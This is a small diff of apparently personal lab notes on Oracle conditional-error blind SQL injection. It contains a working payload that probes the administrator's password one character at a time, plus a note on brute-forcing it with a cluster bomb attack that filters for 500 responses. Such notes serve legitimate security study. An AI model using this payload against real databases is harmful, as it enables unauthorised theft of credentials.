@@ -48,4 +48,4 @@ Analysis:
 
 ' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password, 2, 1)='a') ||'
 - a is not the first character of the password
-- use includer cluster bomb attack with first payload numbers and second payloads bruteforce
+- use includer cluster bomb attack with payload #1 numbers and payload #2 bruteforce then filter 500 code response
